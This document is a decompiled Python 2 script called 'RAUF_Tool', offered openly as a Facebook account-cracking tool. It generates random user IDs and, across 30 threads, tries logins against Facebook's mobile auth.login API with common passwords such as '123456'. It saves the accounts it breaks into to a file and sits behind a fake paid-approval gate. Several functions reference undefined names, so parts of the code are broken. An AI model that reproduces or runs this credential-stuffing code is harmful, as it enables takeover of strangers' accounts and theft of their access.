#Decompiled By D3M09
#It not just a name,Its A brand
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass, uuid, requests
logo2 = '\x1b[1;91m         ____ _____ __  __  ___   ___\n\x1b[1;91m        |  _ \\___ /|  \\/  |/ _ \\ / _ \\\n\x1b[1;92m        | | | ||_ \\| |\\/| | | | | (_) |\n\x1b[1;92m        | |_| |__) | |  | | |_| |\\__, |\n\x1b[1;91m        |____/____/|_|  |_|\\___/   / /\n\x1b[1;91m                                  / /\n\x1b[1;97m'

def tik():
    titik = [
     '   ', '.  ', '.. ', '...', '.. ', '.  ', '   ']
    for o in titik:
        print '\r\x1b[1;91m     [\xe2\x97\x8f] \x1b[1;92mWait A Few Moments \x1b[1;92m' + o,
        sys.stdout.flush()
        time.sleep(0.5)


def jenw():
    os.system('rm -rf .txt')
    os.system('clear')
    print logo2
    print '\x1b[1;92mSet Phone Number Amount You Want To Clone.\n    Example:1000,2000,10000,50000\n'
    walid = input('\x1b[1;92mEnter Amount\x1b[1;93m\xe2\x80\xa2\xe2\x9e\xa2 \x1b[1;96m')
    tik()
    for n in range(walid):
        nmbr = random.randint(1111111, 9999999)
        sys.stdout = open('.txt', 'a')
        print nmbr

    sys.stdout.flush()


logo3 = '\x1b[1;91m         ____ _____ __  __  ___   ___\n\x1b[1;91m        |  _ \\___ /|  \\/  |/ _ \\ / _ \\\n\x1b[1;92m        | | | ||_ \\| |\\/| | | | | (_) |\n\x1b[1;92m        | |_| |__) | |  | | |_| |\\__, |\n\x1b[1;91m        |____/____/|_|  |_|\\___/   / /\n\x1b[1;91m                                  / /\n\x1b[1;97m'


def reg():
    os.system('clear')
    print logo3
    print ''
    print '\x1b[1;31;1mAccess For This Tools Get Approval First '
    print ''
    time.sleep(1)
    try:
        to = open('/sdcard/DCIM/.Rauf.txt', 'r').read()
    except (KeyError, IOError):
        reg2()

    r = requests.get('https://raw.githubusercontent.com/Darkrulex/Random-Pro/main/server.txt').text
    if to in r:
        jenw()
    else:
        os.system('clear')
        print logo3
        print '\tApproved Failed'
        print ' \x1b[1;92mYour Id Is Not Approved '
        print ' \x1b[1;92mCopy the id and send to Admin'
        print ' \x1b[1;92mYour id : ' + to
        raw_input('\x1b[1;92m Press enter to send id')
        os.system('am start https://www.facebook.com/Raufonfire')
        reg()


def reg2():
    os.system('clear')
    print logo3
    print '\tApproval not detected'
    print ' \x1b[1;92mCopy and press enter ,'
    id = uuid.uuid4().hex[:50]
    print ' Your id: ' + id
    print ''
    raw_input(' Press enter to go to Facebook')
    os.system('am start https://www.facebook.com/Raufonfire')
    sav = open('/sdcard/DCIM/.Rauf.txt', 'w')
    sav.write(id)
    sav.close()
    raw_input('\x1b[1;92m Press enter to check Approval ')
    reg()



try:
    import mechanize
except ImportError:
    os.system('pip2 install request')
    time.sleep(1)
    os.system('Then type: python2 R4nd0m.py')

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def keluar():
    print 'Thanks.'
    os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.1)


def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;93mstart cloning \x1b[1;91m' + o,
        sys.stdout.flush()
        time.sleep(1)


back = 0
oks = []
id = []
cpb = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'
os.system('clear')
print
logo1 = '\x1b[1;91m         ____ _____ __  __  ___   ___\n\x1b[1;91m        |  _ \\___ /|  \\/  |/ _ \\ / _ \\\n\x1b[1;92m        | | | ||_ \\| |\\/| | | | | (_) |\n\x1b[1;92m        | |_| |__) | |  | | |_| |\\__, |\n\x1b[1;91m        |____/____/|_|  |_|\\___/   / /\n\x1b[1;91m                                  / /\n\x1b[1;97m'
print logo1
print 48 * '\x1b[1;91m-'
CorrectUsername = 'Hello'
CorrectPassword = 'World'
loop = 'true'
while loop == 'true':
    username = raw_input('\x1b[1;92m \x1b[1;92mTool Username \x1b[1;92m:\x1b[1;92m')
    if username == CorrectUsername:
        password = raw_input('\x1b[1;92m \x1b[1;92mTool Password \x1b[1;92m:\x1b[1;92m')
        if password == CorrectPassword:
            print 'Logged in successfully as a Paid'
            time.sleep(1)
            loop = 'false'
        else:
            print '\x1b[1;92mWrong Password'
            os.system('xdg-open www.facebook.com/Raufonfire')
    else:
        print '\x1b[1;92mWrong Username'
        os.system('xdg-open  www.facebook.com/Raufonfire')

def lisensi():
    os.system('clear')
    login()


def login():
    os.system('clear')
    print logo1
    print 48 * '\x1b[1;91m-'
    print '\x1b[1;91m[\x1b[1;92m1\x1b[1;91m]\x1b[1;92m START CRACKING'
    time.sleep(0.05)
    print '\x1b[1;91m[\x1b[1;92m0\x1b[1;91m]\x1b[1;92m BACK\x1b[1;92m'
    pilih_login()


def pilih_login():
    peak = raw_input('\n\x1b[1;91m[\x1b[1;92m*\x1b[1;91m]\x1b[1;92m CHOOSE: \x1b[1;92m')
    if peak == '':
        print '\x1b[1;92mFill In Correctly'
        pilih_login()
    elif peak == '1':
        Zeek()


def Zeek():
    os.system('clear')
    print logo1
    print 48 * '\x1b[1;91m-'
    print ''
    print '\x1b[1;91m[\x1b[1;92m1\x1b[1;91m]\x1b[1;92m START CRACK \x1b[1;91m[\x1b[1;92m2009-2010\x1b[1;91m]'
    print '\x1b[1;91m[\x1b[1;92m1\x1b[1;91m]\x1b[1;92m START CRACK \x1b[1;91m[\x1b[1;92m2007-2009\x1b[1;91m]'
    print '\x1b[1;91m[\x1b[1;92m1\x1b[1;91m]\x1b[1;92m START CRACK \x1b[1;91m[\x1b[1;92m2005-2007\x1b[1;91m]'
    print '\x1b[1;91m[\x1b[1;92m1\x1b[1;91m]\x1b[1;92m START CRACK \x1b[1;91m[\x1b[1;92m2004-2005\x1b[1;91m]'
    time.sleep(0.05)
    print '\x1b[1;91m[\x1b[1;92m0\x1b[1;91m]\x1b[1;92m BACK'
    time.sleep(0.05)
    action()


def action():
    global cpb
    global oks
    peak = raw_input('\n\x1b[1;91m[\x1b[1;92m*\x1b[1;91m]\x1b[1;92m CHOOSE:\x1b[1;92m')
    if peak == '':
        print '[!] Fill In Correctly'
        action()
    elif peak == '1':
        os.system('clear')
        print logo1
        print 48 * '\x1b[1;91m-'
        print '\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m FACEBOOK UID ACCOUNT CLONER'
        print '\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;96m TYPE 2 DIGIT UID CODE'
        print '\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m 00,01,02,03,04,05,06,07,08,09,10'
        print '\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;93m 11,11,12,13,14,15,16,17,18,19,20'
        try:
            c = raw_input('\n\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m CHOOSE : ')
            k = '100000'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            blackmafiax()

    elif peak == '0':
        login()
    else:
        print '[!] Fill In Correctly'
        action()
    print 48 * '\x1b[1;91m-'
    xxx = str(len(id))
    jalan('\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m TOTAL UID NUMBER : ' + xxx)
    jalan('\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m UID YOU CHOOSE   : ' + c)
    jalan('\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m START UID ACCOUNT CRACKING...')
    jalan('\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m STOP THIS PROSSES CTRL+Z')
    print 48 * '\x1b[1;91m-'

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            pass1 = '123456'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m [\x1b[1;92mRAUF-OK\x1b[1;92m] ' + k + c + user + '  |  ' + pass1
                okb = open('save/Rauf.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m [\x1b[1;91mRAUF-CP\x1b[1;91m] ' + k + c + user + '  |  ' + pass1
                cps = open('save/Rauf.txt', 'a')
                cps.write(k + c + user + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                pass2 = '1234567'
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;92m [\x1b[1;92mRAUF-OK\x1b[1;92m]  ' + k + c + user + '  |  ' + pass2
                    okb = open('save/Rauf.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;91m [\x1b[1;91mRAUF-CP\x1b[1;91m] ' + k + c + user + '  |  ' + pass2
                    cps = open('save/Rauf.txt', 'a')
                    cps.write(k + c + user + pass2 + '\n')
                    cps.close()
                    cpb.append(c + user + pass2)
                else:
                    pass3 = '123456789'
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m [\x1b[1;92mRAUF-OK\x1b[1;92m]  ' + k + c + user + '  |  ' + pass3
                        okb = open('save/Rauf.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;91m [\x1b[1;91mRAUF-CP\x1b[1;91m] ' + k + c + user + '  |  ' + pass3
                        cps = open('save/Rauf.txt', 'a')
                        cps.write(k + c + user + pass3 + '\n')
                        cps.close()
                        cpb.append(c + user + pass3)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 48 * '\x1b[1;91m-'
    print ' Process Has Been Completed'
    print 'Total OK/CP : ' + str(len(oks)) + '/' + str(len(cpb))
    print ' Cloned Accounts Has Been Saved : save/cloned.txt'
    print '\n    \n    \n    \n    \n\n\x1b[1;92mThanks For Using RAUF_Tool\n\x1b[1;94github\x1b[1;97mhttps://github.com/Niki404.Cyber'
    raw_input('\n\x1b[1;92m[\x1b[1;92mBack\x1b[1;92m]')
    login()


if __name__ == '__main__':
    login()
